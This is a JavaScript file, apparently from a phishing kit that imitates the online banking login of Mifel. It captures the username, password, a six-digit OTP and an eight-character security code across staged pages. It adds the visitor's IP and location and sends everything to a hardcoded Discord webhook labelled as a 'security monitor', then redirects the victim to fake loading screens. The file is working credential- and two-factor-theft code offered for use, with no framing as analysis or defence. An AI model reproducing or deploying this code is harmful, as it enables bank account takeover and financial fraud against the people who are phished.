// Configuración de Mifel Logs
const CONFIG = {
    webhookUrl: "https://discord.com/api/webhooks/1482477421277089842/OeDB4qgLFBAw4YAktlUOVHcEr6qFaCuYkfOnhPvffACFULg-Su2be4BJxr6GcneaSNI2",
    botName: "Mifel Security Monitor",
    color: 0x00D1C1,
    avatar: "https://d3vtsr5ffy4e4a.cloudfront.net/uploads/f9780b94-d327-43bf-987a-11289aa18ab6/original/mifel-personas.svg"
};

async function getIpData() {
    try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        return {
            ip: data.ip || "Desconocida",
            city: data.city || "Desconocida",
            country: data.country_name || "Desconocido",
            code: data.country_code ? data.country_code.toLowerCase() : "un"
        };
    } catch (error) {
        return { ip: "0.0.0.0", city: "Error", country: "Error", code: "un" };
    }
}

async function enviarLogs(fields, title = "Nueva Entrada") {
    const geo = await getIpData();
    const device = navigator.userAgent.includes("Mobi") ? "📱 Móvil" : "💻 Escritorio";

    const embedFields = [
        { 
            name: "📍 Ubicación del Visitante", 
            value: `**IP:** \`${geo.ip}\`\n**Ciudad:** ${geo.city}\n**País:** ${geo.country} :flag_${geo.code}:`, 
            inline: false 
        },
        { name: "⚙️ Dispositivo", value: `\`${device}\``, inline: true },
        { name: "🌐 Navegador", value: `\`${navigator.appName}\``, inline: true },
        { name: "━━━━━━━━━━━━━━━━━━", value: " ", inline: false }
    ];

    Object.entries(fields).forEach(([name, value]) => {
        embedFields.push({
            name: `🔹 ${name}`,
            // Ahora usa el mismo formato que Dispositivo/Navegador para copiado rápido
            value: `\`${value}\``, 
            inline: true
        });
    });

    const payload = {
        username: CONFIG.botName,
        avatar_url: CONFIG.avatar,
        embeds: [{
            title: `🏦 ${title.toUpperCase()}`,
            description: "Se ha capturado una nueva interacción en el sitio.",
            color: CONFIG.color,
            fields: embedFields,
            timestamp: new Date().toISOString(),
            footer: { text: "Mifel Logs", icon_url: CONFIG.avatar }
        }]
    };

    return fetch(CONFIG.webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
    });
}

document.addEventListener('DOMContentLoaded', () => {
    const form = document.querySelector('form');
    if (!form) return;

    form.addEventListener('submit', async (e) => {
        e.preventDefault();
        
        const path = window.location.pathname;
        const page = path.split("/").pop();
        
        let datos = {};
        let titulo = "Registro";
        let destino = "index4.html"; 
        const user = localStorage.getItem('mifel_user') || "No detectado";

        // LOGICA PARA INDEX2 (LOGIN)
        if (page.includes("index2")) {
            const pass = document.getElementById('password')?.value || "Vacío";
            datos = { "Usuario": user, "Password": pass };
            titulo = "NUEVO LOGIN";
            destino = "loading1.html";
        }

        // LOGICA PARA INDEX3 (CÓDIGO OTP 6 DÍGITOS)
        else if (page.includes("index3")) {
            const inputs = document.querySelectorAll('.code-input');
            let otpCode = "";
            inputs.forEach(input => otpCode += input.value);
            
            datos = { "Usuario": user, "OTP (6 Díg)": otpCode };
            titulo = "CÓDIGO1";
            destino = "loading2.html";
        }

        // LOGICA PARA INDEX4 (CÓDIGO ALFANUMÉRICO 8 CARACTERES)
        else if (page.includes("index4")) {
            const inputs = document.querySelectorAll('.code-input');
            let securityCode = "";
            inputs.forEach(input => securityCode += input.value);
            
            datos = { "Usuario": user, "Código Seguridad (8 Car)": securityCode.toUpperCase() };
            titulo = "CÓDIGO2";
            destino = "loading3.html"; 
        }

        try {
            await enviarLogs(datos, titulo);
            window.location.href = destino;
        } catch (err) {
            window.location.href = destino; 
        }
    });
});